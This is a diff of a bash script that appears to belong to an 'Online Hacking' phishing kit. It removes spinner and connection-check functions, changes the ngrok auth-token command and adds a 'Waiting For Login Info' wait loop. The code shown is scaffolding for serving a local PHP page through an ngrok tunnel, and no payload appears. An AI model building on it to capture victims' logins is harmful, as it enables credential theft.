@@ -654,9 +654,6 @@ Online Hacking © \e[92m
 }
 
 
-cd_home() {
-cd /usr/bin/.SUMAN/
-}
 
 
 ## LOGO 1
@@ -884,7 +881,7 @@ echo ""
 echo -e "\e[31m[\e[32m*\e[31m]\e[33m Sign up & Click Getting Started or Authtoken Button & Copy Auth Token \e[m "
 echo ""
 read -p $'\e[31m[\e[32m*\e[31m]\e[33m Input AuthToken Only \e[91m[Ex. \e[92m2cEG2LcBt**********WK5Ntc \e[92m] : \e[0m' token
-sudo ngrok config add-authtoken $token
+./ngrok config add-authtoken $token
 echo ""
 fi
 if [[ $option == *'n'* ]]; then
@@ -905,133 +902,12 @@ echo ""
 }
 
 
-connection() {
-while :
-do
-if curl -s --head  --request GET www.google.com | grep "200 OK" > /dev/null ; then
-    echo -e "\e[1;92m>> \e[1;93mCheck Your Connection..... \e[1;96m[\e[1;92m Active ●\e[1;96m ]\e[m"
-    echo 
-    sleep 3
-    break
-else
-    echo -e "\e[1;92m >> \e[1;93mCheck Your Connection..... \e[1;96m[\e[1;91m Inactive ●\e[1;96m ]\e[m"
-    sleep 2
-    echo
-    echo -e "\e[1;92m>> \e[1;91mCheck your connection and Try Again!!\e[m"
-    sleep 3
-    echo
-    exit
-fi
-done
-}
 
-#spin
-spin_1 () {
-local pid=$!
-local delay=0.05
-local spinstr='|/-\'
-while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
-local temp=${spinstr#?}
-tput civis
-printf "\e[1;91m\r[\e[92m*\e[91m]\e[1;93m Online Hacking Server Connecting... \e[96m[\e[1;92m%c\e[1;93m\e[96m]\e[0m  " "$spinstr"
-local spinstr=$temp${spinstr%"$temp"}
-sleep $delay
-printf "\b\b\b\b\b\b"
-done
-printf "   \b\b\b"
-tput cnorm
-printf "\e[1;96m [\e[1;92m Connect Successfully \e[1;96m]\e[0m"
-echo
-}
-
-#spin
-spin_2 () {
-local pid=$!
-local delay=0.05
-local spinstr='|/-\'
-while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
-local temp=${spinstr#?}
-tput civis
-printf "\e[1;91m\r[\e[92m*\e[91m]\e[1;93m Server Status Chacking ... \e[96m[\e[1;92m%c\e[1;93m\e[96m]\e[0m  " "$spinstr"
-local spinstr=$temp${spinstr%"$temp"}
-sleep $delay
-printf "\b\b\b\b\b\b"
-done
-printf "   \b\b\b"
-tput cnorm
-printf "\e[1;96m [\e[1;92m Online ● \e[1;96m]\e[0m"
-echo
-}
-
-spinner_1 () {
-
-local pid=$!
-local delay=0.25
-local spinner=( '█■■■■' '■█■■■' '■■█■■' '■■■█■' '■■■■█' )
-
-while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
-
-for i in "${spinner[@]}"
-do
-	tput civis
-	echo -ne "\033[1;91m\r[\e[1;92m*\e[1;91m]\e[1;96m PHP Server Now Startng ... \e[1;93m[\033[1;92m$i\033[1;93m]\033[0m   ";
-	sleep $delay
-	printf "\b\b\b\b\b\b\b\b";
-done
-done
-printf "   \b\b\b\b\b"
-tput cnorm
-printf "\e[1;95m [\e[1;92m Running \e[1;95m]\e[0m";
-echo "";
-}
-
-spinner_2 () {
-
-local pid=$!
-local delay=0.25
-local spinner=( '█■■■■' '■█■■■' '■■█■■' '■■■█■' '■■■■█' )
-
-while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
-
-for i in "${spinner[@]}"
-do
-	tput civis
-	echo -ne "\033[1;91m\r[\e[1;92m-\e[1;91m]\e[1;95m Start LocalHost...   \e[97m http://127.0.0.1:4444 \e[1;93m[\033[1;92m$i\033[1;93m]\033[0m   ";
-	sleep $delay
-	printf "\b\b\b\b\b\b\b\b";
-done
-done
-printf "   \b\b\b\b\b"
-tput cnorm
-printf "\e[1;96m [\e[1;92m Done \e[1;96m]\e[0m";
-echo "";
-}
-
-spinner_3 () {
-
-local pid=$!
-local delay=0.25
-local spinner=( '█■■■■' '■█■■■' '■■█■■' '■■■█■' '■■■■█' )
-
-while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
-
-for i in "${spinner[@]}"
-do
-	tput civis
-	echo -ne "\033[1;91m\r[\e[1;95m-\e[1;91m]\e[1;92m Launching Link Service ... \e[1;93m[\033[1;92m$i\033[1;93m]\033[0m   ";
-	sleep $delay
-	printf "\b\b\b\b\b\b\b\b";
-done
-done
-printf "   \b\b\b\b\b"
-tput cnorm
-printf "\e[1;92m [ Done ]\e[0m";
-echo "";
-}
 
 end () {
-echo -----------------------------------------------------------------
-echo "VM can't connect? Restart Cloud Shell then Re-run script."
+echo ""
+echo "\e[91m[\e[92m*\e[91m]\e[1;93m \e[0m\e[1;95m Waiting For Login Info, \e[92mCtrl + C \e[1;95mto Exit...\e[93m"
+echo ""
 seq 1 43200 | while read i; do echo -en "\r Running .     $i s /43200 s";sleep 0.1;echo -en "\r Running ..    $i s /43200 s";sleep 0.1;echo -en "\r Running ...   $i s /43200 s";sleep 0.1;echo -en "\r Running ....  $i s /43200 s";sleep 0.1;echo -en "\r Running ..... $i s /43200 s";sleep 0.1;echo -en "\r Running     . $i s /43200 s";sleep 0.1;echo -en "\r Running  .... $i s /43200 s";sleep 0.1;echo -en "\r Running   ... $i s /43200 s";sleep 0.1;echo -en "\r Running    .. $i s /43200 s";sleep 0.1;echo -en "\r Running     . $i s /43200 s";sleep 0.1; done
 }
 
@@ -1067,9 +943,7 @@ clear
 echo -e $'' 
 clear
 logo1
-logo_text
- server
-			   select_url
+select_url
 			   
 echo ""
                  
